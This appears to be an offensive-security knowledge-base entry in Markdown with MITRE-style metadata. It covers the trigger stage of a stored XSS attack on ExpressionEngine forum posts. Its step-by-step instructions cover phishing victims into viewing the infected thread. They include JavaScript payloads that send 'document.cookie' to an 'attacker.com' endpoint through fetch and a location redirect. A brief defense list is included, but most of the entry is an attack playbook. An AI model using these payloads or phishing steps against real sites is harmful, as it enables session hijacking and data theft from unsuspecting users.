---
tags:
  - xss
  - stored-xss
  - javascript-execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: e4e54706-acb9-4f58-85c0-d6d25126179b
created_at: '2025-12-13T23:52:20.992Z'
updated_at: '2025-12-13T23:52:20.992Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-JavaScript-Execution-on-View

## Summary

This procedure triggers the execution of the stored XSS payload in victims' browsers by having them view the infected ExpressionEngine forum post, resulting in arbitrary JavaScript running client-side.

## Description

Once the payload is stored via the 'URL' tag bypass, any user viewing the forum thread will parse the malicious HTML, executing the embedded JavaScript. This can steal session cookies, redirect users, or perform other client-side exploits. The attack relies on social engineering to direct victims to the thread. No additional attacker interaction is needed post-injection; execution is automatic on render. Outcomes include compromised user sessions or data exfiltration to attacker servers.

## Requirements

1. Stored payload from prior injection
2. Victim access to the forum (e.g., via shared link)
3. Attacker-controlled endpoint for callback verification (optional)

## Defense

Defensive measures and detection strategies:

- Enable strict XSS auditing in browsers and server logs
- Use output encoding for all forum content
- Implement user reporting for suspicious posts
- Deploy endpoint detection for anomalous JavaScript behavior

## Objectives

1. Execute JavaScript in the victim's browser context
2. Achieve session hijacking or data collection
3. Confirm exploitation via network indicators

## Instructions

### Step 1: Distribute the Infected Link

**Context**: Share the forum thread URL with potential victims to prompt viewing.

Use phishing emails, social posts, or direct links: "Check out this interesting discussion: [forum URL]".

> Track clicks if using a shortened URL or beacon.

### Step 2: Monitor Execution

**Context**: Observe payload activation when the victim loads the page.

Include a callback in the payload, e.g., `javascript:fetch('http://attacker.com/log?cookie='+document.cookie)`, to log execution.

> Check attacker server logs for incoming requests from victim IPs.

### Step 3: Exploit Outcomes

**Context**: Leverage executed JS for further attacks, like sending cookies or keystrokes.

Modify payload for specific goals, e.g., `document.location='http://attacker.com/steal?session='+document.cookie`.

> Verify success by receiving exfiltrated data or session takeover.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[javascript-execution]]
